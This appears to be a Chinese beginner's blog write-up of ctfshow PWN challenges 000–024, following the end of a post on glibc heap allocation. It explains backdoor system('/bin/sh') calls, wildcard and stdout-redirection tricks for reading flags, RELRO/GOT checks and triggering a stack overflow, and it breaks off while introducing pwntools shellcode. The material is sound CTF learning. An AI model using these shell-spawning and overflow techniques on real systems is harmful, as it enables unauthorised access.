如果不在fastbin范围内，或者没用chunk可用。（两者满足一个或者都满足的话）\n继续判断是否在smallbin范围内：\n在smallbin范围内，检查对应大小的bin链表中有无chunk。 有chunk，那就取出来给程序，至此完成。 不在smallbin范围内，或者smallbin里面也没有chunk。这时候跳到unsortedbin的检查。 unsortedbin中有无chunk？\n有，从尾部取出第一个chunk，看看大小是否满足需求。\n满足，切分后大小是否大于minsize？ 大于，再切分块，返回给用户，剩下的块放进unsortedbin。 小于或等于minsize，直接返回给用户，完成。 不满足大小需求，把这个块放入smallbin / largebin对应的链表中，继续遍历下一个块。 没。unsortedbin的所有块都不满足，那此时就判断是否在largebin范围。\n是，检查对应的bin链表中有无符合的chunk。 有符合的，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中。 不在，那就再次遍历smallbin / largebin找best fit的chunk。 我去？还是没用，那就从topchunk中切割。 ？？搞什么鬼？？topchunk也不够？那就mmap系统调用 二、当我们调用了free时，程序都干了些什么？\nfree的chunk大小属于fastbin吗？\n是，放进fastbin，至此完成。\n不属于，那就接着判断这个free的chunk是否是mmap分配的。\n是，那就调用munmap回收，完成。\n不是，那就接着判断前一个chunk是否是空闲的。\n是，那就向前合并\n不是，接着判断：后一个chunk是topchunk吗？\n是，那就和topchunk合并，至此完成。\n不是topchunk，那就判断：后一个chunk是free的吗？\n是，那就向后合并，然后放进unsortedbin，终于完成了。 堆动态保护机制的小总结 我的妈啊，难死我了，堆的内存管理机制比较复杂，多刷刷题吧，受不了了，刚开始就上强度了😫。\n我这里有一个发自内心的疑问：堆的本质是指针指来指去吗？O(∩_∩)O\n堆的本质可以理解为通过指针操作管理动态内存的机制，但 “指针指来指去” 只是其表现形式之一，更深层的本质是内存块的分配、释放和复用规则，以及攻击者通过破坏规则实现漏洞利用的过程。理解堆的核心在于掌握内存块的组织结构、堆管理器的行为逻辑，而非单纯的指针操作。\n堆的调试方法 ","date":"2025-09-07T00:00:00Z","headings":[{"id":"linux动态内存管理机制","level":2,"text":"Linux动态内存管理机制\n"},{"id":"堆的调试方法","level":2,"text":"堆的调试方法\n"},{"id":"堆的内存管理机制","level":3,"text":"堆的内存管理机制\n"},{"id":"堆块的管理","level":3,"text":"堆块的管理\n"},{"id":"堆块的合并操作","level":3,"text":"堆块的合并操作\n"},{"id":"结构体","level":3,"text":"结构体\n"},{"id":"各种内存块介绍","level":3,"text":"各种内存块介绍\n"},{"id":"malloc运行流程","level":3,"text":"Malloc运行流程\n"},{"id":"堆动态保护机制的小总结","level":3,"text":"堆动态保护机制的小总结\n"}],"image":"https://expl0rer.top/p/pwn-3/PWN3_hu_367ea2043718e6b0.png","permalink":"https://expl0rer.top/p/pwn-3/","title":"PWN-3"},{"content":"[TOC]\n**前文：以下是我ctfshow的PWN做题记录，欢迎各位前来观看，小弟领教！**还有就是ctfshow-pwn是我入门PWN的第一套题，比较基础，看官方writeup可以知道比较简洁，但有些我看不懂，这是我自己做的过程中写的，都是发自内心理解它们的话，有些可能比较啰嗦，但也必须这样，因为站在新手角度来看必须要这种啰嗦方式去理解才能更深刻，有耐心的朋友可以一直看下去，当然也欢迎PWN大佬前来挑战我！！！😄\nTest_your_nc PWN_000 专用虚拟机镜像，全套在这里，提取码show；虚拟机镜像，用户名为ctfshow，密码是ctfshow。\n看了课也啥都不会或者工具不会下看这\u0026ndash;\u0026gt;CTF Wiki-PWN\n解题过程 ssh连接（记得给虚拟机kali\\Ubuntu或者主机设置打开SSH）：\nssh ctfshow@pwn.challenge.ctf.show -pxxxx\n一开始会让你输入yes/no的，直接yes，然后输入密码，等进程结束会有个交互shell\n用命令ls打开看一下有啥文件，看到有个ctfshow_flag的文件，猜是个装flag的文件夹，直接用cat命令打开就好。注意斜杠/。\nPWN_001 题目 PWN_001 ：提供后门函数，连上即可得到flag\n这里有用到“nc”连接，可以了解一下，方便后续做题。当然Kali自带nc连接的，你用Kali干PWN也行。\n这题送分的，nc连接一下就爆flag了。\n不过说实话我是真不知道PWN_001文件给来干嘛的，直接nc交互一下就出flag了，这题没搞懂ctfshow意图在哪。\n不过我用了下刚学的指令checksec看了看ELF文件信息，发现是没开canary保护的，可以利用栈溢出漏洞\u0026hellip;\n可以看到是64位仅关闭Canary保护。\n接着用64位IDA打开查看main函数（按F5进入反汇编）：\n怪不得直接爆flag出来呢。后门system函数直接运行了。\nPWN_002 题目： PWN_002 给你一个shell，这次需要你自己去获得flag\n到这里度过新手期了。\n这里需要我们输入指令了，一般来说做题习惯看到这样直接ls秒的，不过像我这样入门级别的还得用IDA琢磨琢磨：\n可以看到是没canary保护的\n看到这里有个疑问，为什么system有这么大威力？，这次system里边是一个/bin/sh的软链接，很类似我们的文件地址\nsystem(\u0026quot;/bin/sh\u0026quot;); 是漏洞利用中获取系统 shell 的核心操作，其工作原理涉及函数调用、系统调用和进程创建三个层次，本质是通过标准库函数 system 启动一个 /bin/sh 进程（即命令行解释器），让攻击者获得交互权限。\nsystem 是 C 标准库（libc）中的函数，原型为：\n1 int system(const char *command); 它的功能是执行参数 command 指向的字符串作为系统命令，相当于在终端中输入该命令并执行。\nsystem()函数先fork一个子进程，在这个子进程中调用/bin/sh -c来执行command指定的命令。/bin/sh在系统中一般是个软链接，指向dash或者bash等常用的shell，-c选项是告诉shell从字符串command中读取要执行的命令（shell将扩展command中的任何特殊字符）。父进程则调用waitpid()函数来为变成僵尸的子进程收尸，获得其结束状态，然后将这个结束状态返回给system()函数的调用者。\nsystem(\u0026quot;/bin/sh\u0026quot;) 的工作原理可简化为： 通过 system 函数创建子进程 → 子进程执行 /bin/sh 程序 → 启动交互式 shell 环境。\n这也是漏洞利用中最常用的获取权限的方式 —— 无论通过栈溢出、ROP 还是 ret2libc，最终目标都是让程序执行这条语句（或等效的系统调用）。\nPWN_003 题目： PWN_003 哪一个函数才能读取flag？\n通过前面的分析，我们可以很明显的看出来选项”6”为我们所需要的后门函数，其他的均不会得到我们所想要的flag，在system函数里面的命令都是在终端执行的，赋予system权限较大，在我所写的文章里，包括PWN入门知识讲解和操作系统都明确指出SYSTEM是与操作系统内核接触的，比Administrators的权限还要稍大。\n直接选6秒了，但除这种送分的，其实还需要搞清运行的逻辑：\n跟进一下menu函数里边：\n回到main跟进一下这个“6”的函数，看看里头是不是真在执行system后门函数：\n可以看到，确实是执行了。那么我们也就能得到我们需要的flag。\nPWN_004 题目： PWN_004 或许需要先得到某个神秘字符\n真够阴间的，啥也不给了，才第几道啊就上强度了。\nchecksec看看，然后IDA反编译看看：\n64位二进制保护全开\u0026hellip;\n可以看到有几个似曾相识的函数：strcpy（复制函数把xx复制给s1，也可起到赋值的作用）、strcmp（比较函数，对比，判断作用）、execve（）；我曾说过汇编语言的cmp就有比较作用，这也算是类比吧，回想起来的，不过用AI搜一下也行。\n来说下execve吧，上题讲过system函数，这个也应该知道的：\nexecve 是 Unix/Linux 系统中最核心的系统调用（system call） 之一，用于在当前进程中加载并执行一个新的程序，替换当前进程的代码、数据和堆栈，实现进程 “变身”。它是所有程序启动和替换的底层基础，包括 system 函数、shell 执行命令等最终都会依赖 execve 完成。\n看到这段代码，大致意思是，让s1等于“CTFshowPWN”这段字符串，然后到if判断语句这进行比较：如果s1和s2相等（这里的！不是我们C语言中的“不”的意思啊），就执行execve函数，启动交互权限，从而得到flag。\n至此：下一节就开始前置基础了，开始应用PWN-1、PWN-2、PWN-3所学的知识了。\n前置基础 PWN_005 题目：运行此文件，将得到的字符串以ctfshow{xxxxx}提交。\n如：运行文件后 输出的内容为 Hello_World\n提交的flag值为：ctfshow{Hello_World}\n注：计组原理题型后续的flag中地址字母大写\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\nWelcome_to_CTFshow.asm文本打开后发现是汇编语言文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 section .data msg db \u0026#34;Welcome_to_CTFshow_PWN\u0026#34;, 0 section .text global _start _start: ; 立即寻址方式 mov eax, 11 ; 将11赋值给eax add eax, 114504 ; eax加上114504 sub eax, 1 ; eax减去1 ; 寄存器寻址方式 mov ebx, 0x36d ; 将0x36d赋值给ebx mov edx, ebx ; 将ebx的值赋值给edx ; 直接寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx ; 寄存器间接寻址方式 mov esi, msg ; 将msg的地址赋值给esi mov eax, [esi] ; 将esi所指向的地址的值赋值给eax ; 寄存器相对寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx add ecx, 4 ; 将ecx加上4 mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax ; 基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 2 ; 将2赋值给edx mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax ; 相对基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 1 ; 将1赋值给edx add ecx, 8 ; 将ecx加上8 mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax ; 输出字符串 mov eax, 4 ; 系统调用号4代表输出字符串 mov ebx, 1 ; 文件描述符1代表标准输出 mov ecx, msg ; 要输出的字符串的地址 mov edx, 22 ; 要输出的字符串的长度 int 0x80 ; 调用系统调用 ; 退出程序 mov eax, 1 ; 系统调用号1代表退出程序 xor ebx, ebx ; 返回值为0 int 0x80 ; 调用系统调用 checksec一下这个PWN文件：\nohoh这个保护全关的！IDA的x32位\n这个没main函数，那我们回看那段汇编语言asm，这段汇编语言更像是在帮助我们了解汇编语言的逻辑语法规则的，在PWN-1文章中就有讲过汇编语言，这里就直接跳过详解\n这题开始就有点变样了，“Welcome_to_CTFshow.asm”这文件是一个存放汇编语言的文本文件，需要运行一下转换成像exe这样的可执行文件，在PWN-1讲过elf文件：\n将汇编语言（.asm）文件转换为可执行文件，需要经过汇编（Assemble） 和链接（Link） 两个核心步骤.\n在Kali/Linux上下载nasm编辑器：\n1 sudo apt install nasm 然后下载ld链接器（通常自带）：\n1 sudo apt update \u0026amp;\u0026amp; sudo apt install binutils 汇编转换：将 .asm 转换为目标文件（.obj 或 .o）\n1 nasm -f elf Welcome_to_CTFshow.asm 汇编生成可执行文件：\n1 ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o （Welcome_to_CTFshow1是可执行文件）\n我的建议汇编转换和生成可执行文件的过程都在Kali/Linux/Ubuntu上，比较方便，windows下载比较麻烦。\n生成这个可执行文件之后，直接运行就能得到输出结果了，按照题目要求，加个{}包皮去提交就好了。\nPWN_006 题目：立即寻址方式结束后eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n按照PWN-005那样去转换生成这个可执行文件\n汇编转换：将 .asm 转换为目标文件（.obj 或 .o）\n1 nasm -f elf Welcome_to_CTFshow.asm 汇编生成可执行文件：\n1 ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o （Welcome_to_CTFshow1是可执行文件）\nWelcome_to_CTFshow_PWN???是flag，错了，题目是立即寻址方式结束后eax寄存器的值为？\n那就是得把这个转换出的可执行文件放到IDA上，不过之前记得checksec一下看看是x32还是x64位哦\u0026hellip;\n1 2 3 4 ; 立即寻址方式 mov eax, 11 ; 将11赋值给eax add eax, 114504 ; eax加上114504 sub eax, 1 ; eax减去1 那就加减法咯：11+114504-1=114514\nctfshow{114514}\nPWN_007 题目：寄存器寻址方式结束后edx寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n按照上述方法去得出可执行文件，放入IDA：\n1 2 3 ; 寄存器寻址方式 mov ebx, 0x36d ; 将0x36d赋值给ebx mov edx, ebx ; 将ebx的值赋值给edx 所以ctfshow{0x36D}\nPWN_008 题目：直接寻址方式结束后ecx寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 ; 直接寻址方式 mov ecx, [msg] ; 将msg的地址赋值给ecx 当你编译后发现找不到地址[msg]，然后我们倒回来找题目的Welcome_to_CTFshow文件，用IDA：\n故flag:ctfshow{0x80490E8}\n其实不用去进行编译的，在题目给的文件就能做，编译出来的其实就是题目给的文件。\nPWN_009 题目：寄存器间接寻址方式结束后eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 3 ; 寄存器间接寻址方式 mov esi, msg ; 将msg的地址赋值给esi mov eax, [esi] ; 将esi所指向的地址的值赋值给eax 不是80490E8哈别被误导了，这是虚拟地址哦\n点击跟进：\ndd 636C6557h：dd 是汇编指令中的伪操作符，意为 “定义双字（define double word）”，表示在当前地址处存放一个 4 字节的数值。这里存放的数值是 636C6557h（十六进制）。\nflag:ctfshow{0x636C6557}\nPWN_010 题目：寄存器相对寻址方式结束后eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 3 4 ; 寄存器相对寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx add ecx, 4 ; 将ecx加上4 mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax 然后我们跟进看一下地址：\n也就是这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax\n4是十进制的，地址是16进制的，记得转换一下：\nhex(0x80490E8+4)\u0026ndash;\u0026gt; 080490EC\n对应地址得值是ome_to_CTFshow_PWN\n故flag:ctfshow{ome_to_CTFshow_PWN}\nPWN_011 题目：基址变址寻址方式结束后的eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 3 4 ; 基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 2 ; 将2赋值给edx mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax 同样的，放到IDA上找这个基址变址寻址方式：\n双击点dword去跟进到地址：\n计算最终也是 [0x80490E8 + 2*2 ] = [0X80490EC]\n其实也是和PWN_010一样：hex(0x80490E8+4)\n就是说hex(0x80490E8 + 2*2 )=0X80490EC，对应的是“ome_to_CTFshow_PWN”。\nflag：ctfshow{ome_to_CTFshow_PWN}\nPWN_012 题目：相对基址变址寻址方式结束后eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 3 4 5 ; 相对基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 1 ; 将1赋值给edx add ecx, 8 ; 将ecx加上8 mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax 跟进offset dword_80490E8：\n那就是：[8 + 0x80490E8 + 1*2 - 6] = [0x80490EC]\n故flag:ctfshow{ome_to_CTFshow_PWN}\nPWN_013 题目：如何使用GCC？编译运行后即可获得flag PWN_013.c\n学过C语言都会安装配置编译器环境的，我这里使用的是visual-studio-code。\n这段代码是一个简单的 C 程序，它使用字符数组 flag 存储了一个加密的字符串，并通过 printf函数将其打印出来。\n在这段代码中， flag 数组存储了一串整数值，这些整数值代表了字符的 ASCII 码。通过将这些整数值转换为相应的字符，就可以还原出原始的字符串。\n运行该程序， printf 函数使用 %s 格式字符串将 flag 数组作为参数进行打印。由于 flag 数组的最后一个元素为零（NULL 字符）， printf 函数会将其之前的字符依次打印，直到遇到 NULL 字符为止。根据给定的整数值数组，还原出的字符串为： ctfshow{hOw_t0_us3_GCC?} 。\nPWN_014 题目：请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag。 PWN_014.c\n这个文件有强度了，直接编译运行会说nothing is here，不给flag，先读一下这个C语言文件在干什么的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 int main() { FILE *fp; // 文件指针，用于操作文件 unsigned char buffer[BUFFER_SIZE]; // 缓冲区，存储从文件读取的二进制数据 size_t n; // 记录每次实际读取的字节数 fp = fopen(\u0026#34;key\u0026#34;, \u0026#34;rb\u0026#34;); // 以二进制只读方式打开名为 \u0026#34;key\u0026#34; 的文件 // 检查文件是否成功打开 if (fp == NULL) { perror(\u0026#34;Nothing here!\u0026#34;); // 若打开失败，打印错误信息 return -1; } // 输出缓冲区：大小为 BUFFER_SIZE*9 + 12（预留足够空间存储二进制字符串和分隔符） char output[BUFFER_SIZE * 9 + 12]; int offset = 0; // 记录 output 中当前已使用的位置（偏移量） // 先在 output 开头写入 \u0026#34;ctfshow{\u0026#34; offset += sprintf(output + offset, \u0026#34;ctfshow{\u0026#34;); // 循环读取文件内容：每次最多读 BUFFER_SIZE 字节，直到文件结束 while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) \u0026gt; 0) { // 遍历本次读取的每个字节 for (size_t i = 0; i \u0026lt; n; i++) { // 将当前字节拆分为 8 位二进制（从高位到低位） for (int j = 7; j \u0026gt;= 0; j--) { // (buffer[i] \u0026gt;\u0026gt; j) \u0026amp; 1：获取第 j 位（0 或 1），并写入 output offset += sprintf(output + offset, \u0026#34;%d\u0026#34;, (buffer[i] \u0026gt;\u0026gt; j) \u0026amp; 1); } // 除了最后一个字节，每个字节的二进制后加下划线 \u0026#34;_\u0026#34; if (i != n - 1) { offset += sprintf(output + offset, \u0026#34;_\u0026#34;); } } // 若未到文件末尾，在本次缓冲区数据后加空格 \u0026#34; \u0026#34;（分隔不同批次的读取） if (!feof(fp)) { offset += sprintf(output + offset, \u0026#34; \u0026#34;); } } // 在 output 末尾写入 \u0026#34;}\u0026#34;，完成格式包裹 offset += sprintf(output + offset, \u0026#34;}\u0026#34;); // 打印最终生成的字符串 printf(\u0026#34;%s\\n\u0026#34;, output); fclose(fp); // 关闭文件 return 0; } 也就是说我们需要一个名为key的文件，让这个程序知道，然后他就能把flag字符串吐出来了。\n1 $ echo \u0026#34;CTFshow\u0026#34;\u0026gt; key #创建一个名为key得文件，向内输入“CTFshow”的字符串 答案是ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}\n题目要求在key里加CTFshow字符串，加其它是错的，输出结果不同。\nPWN_015 题目：编译汇编代码到可执行文件，即可拿到flag。 flag.asm\n汇编转换：将 .asm 转换为目标文件（.obj 或 .o）\n1 nasm -f elf flag.asm 汇编生成可执行文件：\n1 ld -m elf_i386 -s -o flag1 flag.o （flag1是可执行文件）\n比较简单，和PWN_005很类似，都是汇编语言编译运行之类的。\nctfshow{@ss3mb1y_1s_3@sy}\nPWN_016 题目：使用gcc将其编译为可执行文件。 flag.s\n1 gcc flag.s -o flag 可以使用 gcc 命令直接编译汇编语言源文件（ .s 文件）并将其链接为可执行文件。 gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。\n故flag：ctfshow{daniuniuda}\nPWN_017 题目：有些命令好像有点不一样？不要一直等，可能那样永远也等不到flag。\n比较奇葩的是，这里选择3的话，一直在loading的，可能是不通的，我换到主机的nc也不行，那就是选2进程的\n选了2后，程序开始发癫了\u0026hellip;.，一直循环搞得我Kali虚拟机卡死了，进到IDAx64去看：\n这个case2的read函数只读取10字节以内的，也就是说ctfshow_flag（12byte）这串是超字节限制了。不过之前学了那个指令有通配符的cat ctf*（因为当你选择”ls ./“，打开全部文件后，发现只有一个ctfshow_flag时由ctf字眼的，那我们正好可以绕过超字节的限制了）\n搜索打开由ctf这串字符的文件内容：\nPWN_018 题目：仔细看看源码，或许有惊喜；假作真时真亦假，真作假时假亦真。 PWN_018\n连接nc后一上来就问：\n这我哪知道啊？去看IDAx64：\n分别跟进一下real和fake：\n解读一下发现一个机制：当v4不等于9时就会执行real函数，这时real会执行echo 'flag is here'\u0026gt;/ctfshow_flag，这个命令将字符串 \u0026lsquo;flag is here\u0026rsquo; 覆盖写入 /ctfshow_flag 文件中。 \u0026gt; 符号表示以覆盖的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会将文件中原有的内容替换为 \u0026lsquo;flag is here\u0026rsquo; 。也就是说你第一次和靶机交互时没输入9，你以后都不得不到flag了，只能重开靶机\u0026hellip;..比较CS吧\u0026hellip;\necho 'flag is here'\u0026gt;\u0026gt;/ctfshow_flag这个命令将字符串 \u0026lsquo;flag is here\u0026rsquo; 追加写入 /ctfshow_flag 文件中。 \u0026raquo; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会在文件的末尾添加 \u0026lsquo;flag is here\u0026rsquo; 。\n这两个命令都用于将 \u0026lsquo;flag is here\u0026rsquo; 写入 /ctfshow_flag 文件中，不同之处在于写入方式的不同。第一个命令使用追加方式，在文件末尾添加内容；第二个命令使用覆盖方式，将文件内容替换为新内容。具体使用哪个命令取决于需求和文件操作的预期结果。也就是所假的其实是我们需要的真的，真的反而是假的在远程环境中，我们需要在第一次读到flag，否则后续得到的flag都已经被覆写再追加，真实的flag内容已经没了。\nPWN_019 题目：关闭了输出流，一定是最安全的吗？ PWN_019\n在IDA上看到，是由read和system函数的，按道理我直接cat /ctf*应该就出flag了啊\u0026hellip;\n问题就出在这个fclose函数（确实没辙了，只能用AI解释一下了）作用是关闭文件输出流，标准输出被关闭了（无法显示）。\n那还有输入流啊，可以用重定向：1\u0026gt;\u0026amp;0\n这是 Linux 的 I/O 重定向语法：\n1 代表标准输出（stdout）（正常情况下，命令的输出会送到这里，显示在终端）； 0 代表标准输入（stdin）（正常情况下，用户输入从这里读取，通常指向终端）； 1\u0026gt;\u0026amp;0 表示：将标准输出重定向到标准输入所指向的位置。 因为代码中标准输出被关闭了（无法显示），但标准输入（通常是终端）仍然可用，所以通过这个重定向，cat 命令的输出会被 “转移” 到标准输入对应的终端，从而让内容能显示出来。\n简单说就是：正常显示内容的 “输出通道” 被关了，但接收输入的 “输入通道” 还能用。通过 1\u0026gt;\u0026amp;0 把原本该从 “输出通道” 显示的内容，转到 “输入通道” 对应的终端上，这样就能看到 flag 了。ctfshow{a390a91b-5203-46ae-812d-0396de95184f}\n本质上是利用了 “输入通道和终端还连着” 这个漏洞，让内容 “借道” 显示出来～。\nPWN_020 题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}\n例如 .got可写.got.plt表可写其地址为0x400820 0x8208820\n最终flag为ctfshow{1_1_0x400820_0x8208820}\n若某个表不存在，则无需写其对应地址\n如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}\nPWN_020\nchecksec一下：\n在这里只开了NX保护。\n在PWN-1的Linux安全防护机制这一章的学习中，我们有认识到RELRO这个保护。很显然no RELRO意味着.got和.got.plt表都可写。\n用指令查表地址：\n1 readelf -S PWN_020 耐心找一下就找到了，故flag:ctfshow{1_1_0x600f18_0x600f28}\nPWN_021 题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}\n例如 .got可写.got.plt表可写其地址为0x400820 0x8208820\n最终flag为ctfshow{1_1_0x400820_0x8208820}\n若某个表不存在，则无需写其对应地址\n如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}\nPWN_021\nchecksec一下：\n要还不记得Relro保护机制原理的就回PWN-1去看吧\u0026hellip;\n这里是 GOT 表的前半部分（.got.plt）设置为只读，后半部分（.got）仍可写。\n用readelf命令去爱看表地址就好了：\nflag:ctfshow{0_1_0x600ff0_0x601000}\nPWN_021 题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}\n例如 .got可写.got.plt表可写其地址为0x400820 0x8208820\n最终flag为ctfshow{1_1_0x400820_0x8208820}\n若某个表不存在，则无需写其对应地址\n如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}\nPWN_021\n道理一样checksec看relro的保护、readelf看表\u0026hellip;..\n这次就只有一个.got表了，那就是flag：ctfshow{0_0_0x600fc0}\nPWN_023 题目：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接\n1 ssh ctfshow@题目地址 -p题目端口号 不是nc连接 PWN_023\n没有canary保护，这可以是个突破点：栈溢出漏洞。\n看回IDA：\n跟进ctfshow函数\n可以知道，一开始dgets函数读取flag字符串到内存中\n跟进signal函数：\n这行代码会将内存中存储的 flag 字符串，输出到标准错误流（stderr）。因为程序启动时已经通过 fgets 从 /ctfshow_flag 文件读取了 flag 内容到 flag 变量中，所以这里能直接打印出正确的 flag。\n所以说我们让程序报错也就是让它栈溢出，覆盖后的地址还不能是有效地址，让它全部报错，也就是我们可以输入好多个a就行，几十个a的16进制地址是无效地址。\n关于栈溢出这部分，请看PWN-2详细学习，PWN板块占比也是重要的。\n逐渐开始上强度了，这时需要仔细看IDA的代码分析了，看看是什么工作原理。\nflag：ctfshow{0f207f1f-71bb-4cdd-bdab-7bfb9acde27a}\nPWN_024 题目： 你可以使用pwntools的shellcraft模块来进行攻击\nPWN_024\n我来介绍一下shellcraft模块：它是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode（这里的不同体系是我们之前学过的操作系统基础的有关shell的那一章节）有zsh、bash等。Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的Shellcode。\n生成的汇编代码可直接通过 asm() 函数转换为机器码（二进制），无需手动处理格式，例如：\n1 shellcode = asm(shellcraft.i386.sh()) # 一步完成“汇编模板→机器码”转换，类似C语言的编译器功能，转换成机器语言。 IDA：可以看到这题似乎和ret2shellcode有关\n看题目提示，进入新大陆了\u0026hellip;用pwntools了。\n这里有提示，可以看一下PWN-1-NX保护，有啥启发？\n在IDA分析可知，ctfshow函数无法跟进源代码，只能看它的伪代码去分析了（比较长）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 .text:080484C6 ; =============== S U B R O U T I N E ======================================= .text:080484C6 .text:080484C6 ; Attributes: bp-based frame .text:080484C6 .text:080484C6 ; int __cdecl ctfshow(_DWORD) .text:080484C6 public ctfshow .text:080484C6 ctfshow proc near ; CODE XREF: main+132↓p .text:080484C6 .text:080484C6 buf = byte ptr -88h .text:080484C6 var_4 = dword ptr -4 .text:080484C6 .text:080484C6 ; __unwind { .text:080484C6 push ebp .text:080484C7 mov ebp, esp .text:080484C9 push ebx .text:080484CA sub esp, 84h .text:080484D0 call __x86_get_pc_thunk_bx .text:080484D5 add ebx, (offset _GLOBAL_OFFSET_TABLE_ - $) .text:080484DB sub esp, 4 .text:080484DE push 100h ; nbytes .text:080484E3 lea eax, [ebp+buf] .text:080484E9 push eax ; buf .text:080484EA push 0 ; fd .text:080484EC call _read .text:080484F1 add esp, 10h .text:080484F4 sub esp, 0Ch .text:080484F7 lea eax, [ebp+buf] .text:080484FD push eax ; s .text:080484FE call _puts .text:08048503 add esp, 10h .text:08048506 lea eax, [ebp+buf] .text:0804850C call eax .text:0804850E nop .text:0804850F mov ebx, [ebp+var_4] .text:08048512 leave .text:08048513 retn .text:08048513 ; } // starts at 80484C6 .text:08048513 ctfshow endp .text:08048513 .text:08048514 .text:08048514 ; =============== S U B R O U T I N E ======================================= 如果之前是打逆向或者强行入门PWN的话，最坐牢的我相信应该是用IDA吧，除了找明文字符串flag外，你学了汇编语言你也看不懂这是啥意思，感觉一小串源代码转换成汇编语言非常长、枯燥，其实UP主也深有体会，在系统性入门后，也初步知道IDA是怎么用的，这里我把下划线“===== S U B R O U T I N E =====”也复制进来了，按我理解这是函数分界，分隔线上方是前一个函数的结尾（通常以retn指令结束，代表函数返回）过了这条线，说明汇编语言在描述的就是另外一个函数了。也就是说这上下分界线是代表囊括着一个函数，例如这ctfshow函数。\n另外我想说的是汇编语言这么长是有道理的，它更像是一种“啰嗦”，它能在每一段代码运行后不断向你汇报地址变化，这种 “啰嗦” 本质上是对计算机底层操作的直接映射，这种特性确实让它在跟踪程序运行细节、分析逻辑和排查问题时具有独特优势。\n从这里开始就要用pwntools了，这里介绍一下：\nfrom pwn import * 是在 Python 中使用 pwntools 库的常见导入方式 。pwntools 是一个功能强大的用于二进制漏洞利用（binary exploitation）的 Python 库，在 CTF（Capture The Flag，夺旗赛 ）竞赛、安全研究以及漏洞分析等领域广泛应用，以下是其具体作用：\n与目标程序交互 本地进程交互：pwntools 能轻松创建本地进程，模拟用户输入、获取程序输出。例如，p = process('./vulnerable_program') 可以启动本地的可执行文件 vulnerable_program，然后通过 p.sendline('input data') 向程序发送数据，用 p.recvuntil('prompt') 接收程序输出直到遇到特定字符串。 远程服务器交互：在面对远程存在漏洞的服务时，pwntools 提供了便捷的方法。比如 r = remote('target.com', 8080) 可以连接到 target.com 服务器的 8080 端口，后续同样能发送和接收数据，方便对远程服务进行测试和漏洞利用。 二进制数据处理 数据打包和解包：在二进制程序中，经常需要处理不同字节序（大端序、小端序）的数据。pwntools 提供了 pack 和 unpack 函数，比如 p32(0x12345678) 可以将整数 0x12345678 按照小端序打包成 4 字节的二进制数据；u32(data) 则可以将 4 字节的二进制数据按照小端序解包为整数。 数据转换：它还支持各种数据格式之间的转换，如将字符串转换为字节串，或者进行十六进制与二进制数据之间的转换等。 辅助漏洞利用 生成 Payload：对于缓冲区溢出等漏洞，需要精心构造 Payload（攻击载荷）。pwntools 提供了生成填充数据、构造 ROP（Return-Oriented Programming，返回导向编程 ）链等功能。比如 cyclic(100) 可以生成一个 100 字节的循环模式字符串，用于确定缓冲区溢出的偏移量；通过 ROP 模块可以方便地构建 ROP 链来绕过一些安全机制，实现代码执行。 符号解析：在分析二进制程序时，有时需要解析程序中的函数地址、变量地址等。pwntools 可以与 ELF（Executable and Linkable Format，可执行与可链接格式，常用于 Linux 